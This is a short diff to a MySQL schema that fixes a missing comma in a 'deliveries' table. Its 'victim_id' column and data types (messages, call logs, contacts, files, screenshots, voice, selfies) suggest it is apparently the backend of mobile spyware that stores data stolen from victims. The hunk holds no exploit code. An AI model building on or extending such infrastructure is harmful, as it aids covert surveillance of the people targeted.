@@ -76,7 +76,7 @@ DROP TABLE IF EXISTS `deliveries`;
 CREATE TABLE IF NOT EXISTS `deliveries` (
   `id`                   INT(11) NOT NULL    AUTO_INCREMENT,
   `victim_id`            INT(11) NOT NULL,
-  `data_type`            ENUM('messages', 'command_statuses' 'call_logs', 'contacts', 'files', 'media_screen_shot', 'media_voice', 'media_selfie', 'join', 're_join', 'other') NOT NULL,
+  `data_type` ENUM('messages', 'command_statuses', 'call_logs', 'contacts', 'files', 'media_screen_shot', 'media_voice', 'media_selfie', 'join', 're_join', 'other') NOT NULL,
   `error`                TINYINT(4) NOT NULL,
   `message`              TEXT NOT NULL,
   `server_error`         TINYINT(4) NOT NULL DEFAULT 0,
